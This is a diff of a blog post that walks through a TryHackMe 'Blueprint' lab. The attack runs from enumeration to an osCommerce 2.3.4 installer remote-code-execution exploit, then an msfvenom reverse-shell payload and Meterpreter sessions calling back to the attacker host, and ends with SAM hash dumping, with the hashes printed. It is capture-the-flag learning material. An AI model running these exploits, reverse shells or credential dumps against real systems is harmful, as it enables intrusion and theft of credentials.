@@ -10,6 +10,8 @@ In this walkthrough, I will be performing a full penetration test on the TryHack
 
 This machine was very interesting because it demonstrated how dangerous misconfigured web applications and exposed installation directories can be. Throughout this walkthrough, I will explain every step I performed during the exploitation process, along with some additional insights and explanations which can help beginners understand the methodology behind the attack chain.
 
+[Access The TryHackMe Blueprint Machine.](https://asadshamna.github.io/Blueprint-Walkthrough).
+
 ### [](#header-3)Host Discovery
 
 Before starting enumeration, I first verified whether the target machine was alive by sending ICMP packets using the ping command.
@@ -138,17 +140,20 @@ SMB ports 139 and 445 were enabled.
 One of the most interesting findings was the osCommerce installation running on port 8080.
 
 Nmap also revealed the following:
+
 > oscommerce-2.3.4/
 > oscommerce-2.3.4/catalog/
 > oscommerce-2.3.4/docs/
-This immediately became my primary attack vector.
+> This immediately became my primary attack vector.
 
 ### [](#header-3)Directory Enumeration
+
 Now I wanted to enumerate directories and files available inside the osCommerce application. For this task, I used DIRB.
 
 ```js
 dirb http://10.48.162.178:8080/oscommerce-2.3.4/catalog
 ```
+
 DIRB started brute forcing common directories and files using the default wordlist.
 
 #### [](#header-4)DIRB Findings
@@ -159,6 +164,7 @@ DIRB started brute forcing common directories and files using the default wordli
 ==> DIRECTORY: /catalog/includes/
 ==> DIRECTORY: /catalog/images/
 ```
+
 One thing that immediately caught my attention was the /install/ directory.
 
 The installation directory should never remain publicly accessible after deployment because attackers can abuse it to reconfigure the application or achieve remote code execution.
@@ -166,6 +172,7 @@ The installation directory should never remain publicly accessible after deploym
 I stopped the DIRB scan midway because I already had enough information to continue exploitation, but in a real-world engagement it is always recommended to let the scan continue for deeper enumeration.
 
 ### [](#header-3)Vulnerability Analysis
+
 Since I already knew the application version was osCommerce 2.3.4, I searched for publicly available exploits using Searchsploit.
 
 ```js
@@ -182,10 +189,12 @@ osCommerce 2.3.4.1 - Remote Code Execution (2)
 There were multiple exploits available for this version.
 
 I decided to use:
+
 > osCommerce 2.3.4.1 - Remote Code Execution (2)
-because it abuses the exposed installation directory to inject malicious PHP code and achieve unauthenticated remote code execution.
+> because it abuses the exposed installation directory to inject malicious PHP code and achieve unauthenticated remote code execution.
 
 ### [](#header-3)Initial Remote Code Execution
+
 I executed the exploit against the vulnerable target.
 
 ```js
@@ -194,18 +203,23 @@ python3 50128.py http://10.48.162.178:8080/oscommerce-2.3.4/catalog/
 [*] Testing injecting system command to test vulnerability
 User: nt authority\system
 ```
+
 The exploit worked successfully, and I immediately gained remote command execution.
 I verified my privileges:
+
 ```js
 RCE_SHELL$ whoami
 nt authority\system
 ```
+
 At this point I already had SYSTEM privileges, which is very uncommon during initial exploitation. Usually attackers need privilege escalation later in the attack chain, but due to the insecure configuration of the application, the injected PHP code executed with elevated permissions.
 
 However, this shell was unstable and had limited interactivity. I wanted a more reliable Meterpreter session for post exploitation activities.
 
 ### [](#header-3)Using Metasploit Framework
+
 I started PostgreSQL and launched Metasploit Framework.
+
 ```js
 service postgresql start && msfconsole
 ```
@@ -250,20 +264,26 @@ host           port   proto  name          state  info
 ```
 
 ### [](#header-3)Searching for Exploit Modules
+
 I searched Metasploit for osCommerce related modules.
 
 ```js
 msf > search oscommerce
 ```
+
 #### [](#header-4)Available Modules
+
 ```js
 0. exploit/unix/webapp/oscommerce_filemanager
 1. exploit/multi/http/oscommerce_installer_unauth_code_exec
 ```
+
 ```
 I'll use **exploit/multi/http/oscommerce_installer_unauth_code_exec**, This module specifically targets the vulnerable installer directory and injects malicious PHP code to obtain a reverse shell.
 ```
+
 #### [](#header-4)Configuring the Exploit Module
+
 I configured the exploit with the target details.
 
 ```js
@@ -280,15 +300,18 @@ LHOST => 192.168.143.183
 ```
 
 After setting the required options, I executed the exploit.
+
 ```js
-exploit
+exploit;
 ```
 
 #### [](#header-4)Meterpreter Session
+
 The exploit successfully opened a Meterpreter session.
+
 ```js
 msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > exploit
-[*] Started reverse TCP handler on 192.168.143.183:4444 
+[*] Started reverse TCP handler on 192.168.143.183:4444
 [*] Sending stage (42137 bytes) to 10.48.162.178
 [*] Meterpreter session 1 opened (192.168.143.183:4444 -> 10.48.162.178:49462) at 2026-05-20 14:59:58 +0530
 
@@ -298,8 +321,8 @@ OS           : Windows NT BLUEPRINT 6.1 build 7601 (Windows 7 Home Basic Edition
 Architecture : i586
 Meterpreter  : php/windows
 meterpreter > getuid
-Server username: 
-meterpreter > 
+Server username:
+meterpreter >
 ```
 
 Even though I had shell access, the current session was still not ideal for deeper post exploitation activities.
@@ -307,6 +330,7 @@ Even though I had shell access, the current session was still not ideal for deep
 So I decided to generate my own payload using MSFVenom.
 
 #### [](#header-4)Generating a Custom Payload
+
 I created a Windows Meterpreter reverse TCP payload.
 
 ```js
@@ -319,9 +343,11 @@ Payload size: 354 bytes
 Final size of exe file: 7168 bytes
 Saved as: blueprint_win_payload.exe
 ```
+
 MSFVenom generated an x86 Windows executable payload.
 
 Before executing the payload on the victim machine, I configured a listener using Metasploit’s multi/handler module.
+
 ```js
 msf > use multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
@@ -332,12 +358,15 @@ LHOST => 192.168.143.183
 msf exploit(multi/handler) > set LPORT 5555
 LPORT => 5555
 msf exploit(multi/handler) > exploit
-[*] Started reverse TCP handler on 192.168.143.183:5555 
+[*] Started reverse TCP handler on 192.168.143.183:5555
 ```
+
 This listener waits for incoming reverse shell connections from the victim.
 
 #### [](#header-4)Uploading the Payload
+
 Inside the existing Meterpreter session, I navigated to the C:\ drive and created a temporary directory.
+
 ```js
 meterpreter > pwd
 C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
@@ -348,27 +377,35 @@ meterpreter > cd Temp
 meterpreter > ls
 No entries exist in C:\Temp
 ```
+
 I uploaded the payload file.
+
 ```js
 meterpreter > upload /home/asad/THM_Blueprint/blueprint_win_payload.exe
 [*] Uploading  : /home/asad/THM_Blueprint/blueprint_win_payload.exe -> blueprint_win_payload.exe
 [*] Uploaded -1.00 B of 7.00 KiB (-0.01%): /home/asad/THM_Blueprint/blueprint_win_payload.exe -> blueprint_win_payload.exe
 [*] Completed  : /home/asad/THM_Blueprint/blueprint_win_payload.exe -> blueprint_win_payload.exe
 ```
+
 After uploading the payload successfully, I executed it.
+
 ```js
 execute -f blueprint_win_payload.exe
 ```
 
 #### [](#header-4)SYSTEM Level Access
+
 As soon as the payload executed, my multi-handler received a new Meterpreter session.
+
 ```js
-[*] Started reverse TCP handler on 192.168.143.183:5555 
+[*] Started reverse TCP handler on 192.168.143.183:5555
 [*] Sending stage (190534 bytes) to 10.48.162.178
 /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
 [*] Meterpreter session 1 opened (192.168.143.183:5555 -> 10.48.162.178:49566) at 2026-05-20 16:01:34 +0530
 ```
+
 I verified the privileges:
+
 ```js
 meterpreter > sysinfo
 Computer        : BLUEPRINT
@@ -381,11 +418,14 @@ Meterpreter     : x86/windows
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
+
 Now I had a stable Meterpreter session running with full SYSTEM privileges.
 At this stage, the target machine was completely compromised.
 
 ### [](#header-3)Capturing the Root Flag
+
 I navigated to the Administrator Desktop.
+
 ```js
 meterpreter > pwd
 C:\Temp
@@ -399,15 +439,19 @@ Listing: C:\Users\Administrator\Desktop
 100666/rw-rw-rw-  282   fil   2019-04-12 04:06:47 +0530  desktop.ini
 100666/rw-rw-rw-  37    fil   2019-11-27 23:45:37 +0530  root.txt.txt
 ```
+
 I displayed the contents of the root flag.
+
 ```js
 meterpreter > cat root.txt.txt
 ```
 
 ### [](#header-3)Dumping Password Hashes
+
 Since I already had SYSTEM privileges, I decided to dump password hashes from the SAM database.
 
 Using Meterpreter:
+
 ```js
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
@@ -416,13 +460,15 @@ Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
 ```
 
 These NTLM hashes can later be cracked using:
-* JohnTheRipper
-* Hashcat
-* Online NTLM cracking services
+
+- JohnTheRipper
+- Hashcat
+- Online NTLM cracking services
 
 Meterpreter provides the Kiwi extension, which integrates Mimikatz functionality directly into the session.
 
 I loaded the extension:
+
 ```js
 meterpreter > load kiwi
 Loading extension kiwi...
@@ -435,7 +481,9 @@ Loading extension kiwi...
 
 Success.
 ```
+
 Then I dumped the SAM database again using Kiwi.
+
 ```js
 meterpreter > lsa_dump_sam
 [+] Running as SYSTEM
@@ -461,14 +509,16 @@ User : Lab
 This confirmed that the hashes were extracted successfully.
 
 ### [](#header-3)Conclusion
+
 The Blueprint machine was a very good beginner-friendly Windows exploitation lab that covered:
-* Enumeration
-* Web exploitation
-* Remote Code Execution
-* Reverse shells
-* Meterpreter sessions
-* Post exploitation
-* Hash dumping
+
+- Enumeration
+- Web exploitation
+- Remote Code Execution
+- Reverse shells
+- Meterpreter sessions
+- Post exploitation
+- Hash dumping
 
 The main vulnerability was the exposed osCommerce installation directory combined with an outdated version of the application.
 
